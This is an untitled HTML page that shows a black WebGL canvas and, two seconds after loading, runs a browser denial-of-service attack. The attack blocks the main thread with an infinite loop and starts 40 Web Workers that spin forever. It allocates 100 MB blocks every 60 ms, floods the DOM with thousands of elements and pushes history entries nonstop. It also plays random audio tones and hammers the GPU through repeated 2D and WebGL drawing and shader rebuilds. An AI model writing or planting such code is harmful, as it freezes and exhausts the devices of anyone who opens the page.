<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
body{margin:0;overflow:hidden;background:black;}
canvas{position:fixed;left:0;top:0;}
</style>
</head>
<body>

<canvas id="gl"></canvas>

<script>
const canvas=document.getElementById("gl");
canvas.width=innerWidth;
canvas.height=innerHeight;
const gl=canvas.getContext("webgl");
gl.clearColor(0,0,0,1);
gl.clear(gl.COLOR_BUFFER_BIT);

setTimeout(()=>{

setTimeout(()=>{
 while(true){Math.sqrt(Math.random()*Date.now())}
},200);

let mem=[];
setInterval(()=>{
 mem.push(new Uint8Array(100_000_000));
},60);

setInterval(()=>{
 for(let i=0;i<6000;i++){
  let d=document.createElement("div");
  d.textContent=Math.random();
  d.style.position="absolute";
  d.style.left=Math.random()*innerWidth+"px";
  d.style.top=Math.random()*innerHeight+"px";
  document.body.appendChild(d);
 }
},80);

setInterval(()=>{
 history.pushState({}, "", "#"+Math.random());
},20);

for(let i=0;i<40;i++){
 new Worker(URL.createObjectURL(new Blob([`while(true){Math.tan(Math.random())}`])));
}

const AC=window.AudioContext||window.webkitAudioContext;
const ac=new AC();
setInterval(()=>{
 let o=ac.createOscillator();
 o.frequency.value=Math.random()*6000;
 o.connect(ac.destination);
 o.start();
 o.stop(ac.currentTime+0.2);
},40);

const flood=document.createElement("canvas");
document.body.appendChild(flood);
const fx=flood.getContext("2d");

function gpu2d(){
 flood.width=innerWidth;
 flood.height=innerHeight;
 for(let i=0;i<20000;i++){
  fx.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
  fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,30,30);
 }
 requestAnimationFrame(gpu2d);
}
gpu2d();

const quad=[
-1,-1,0,1,-1,0,1,1,0,
-1,-1,0,1,1,0,-1,1,0
];

function frag(){
return `
precision highp float;
void main(){
 vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
 vec3 c=vec3(0.);
 for(int i=0;i<60;i++){
  float t=float(i);
  c+=vec3(
   sin(uv.x*150.+t),
   cos(uv.y*150.-t),
   sin((uv.x+uv.y)*80.)
  );
 }
 gl_FragColor=vec4(c,1.);
}`;
}

const VSHADER=`attribute vec4 p;void main(){gl_Position=p;}`;

function compile(t,s){
 let sh=gl.createShader(t);
 gl.shaderSource(sh,s);
 gl.compileShader(sh);
 return sh;
}

let buf=gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER,buf);
gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(quad),gl.STATIC_DRAW);

function build(){
 let vs=compile(gl.VERTEX_SHADER,VSHADER);
 let fs=compile(gl.FRAGMENT_SHADER,frag());
 let pr=gl.createProgram();
 gl.attachShader(pr,vs);
 gl.attachShader(pr,fs);
 gl.linkProgram(pr);
 gl.useProgram(pr);
 let loc=gl.getAttribLocation(pr,"p");
 gl.vertexAttribPointer(loc,3,gl.FLOAT,false,0,0);
 gl.enableVertexAttribArray(loc);
 return pr;
}

let prog=build();

setInterval(()=>{prog=build()},200);

setInterval(()=>{
 canvas.width=300+Math.random()*2000;
 canvas.height=300+Math.random()*2000;
 gl.viewport(0,0,canvas.width,canvas.height);
},150);

function draw(){
 for(let i=0;i<20;i++){
  gl.drawArrays(gl.TRIANGLES,0,6);
 }
 gl.finish();
 requestAnimationFrame(draw);
}
draw();

},2000);
</script>

</body>
</html>
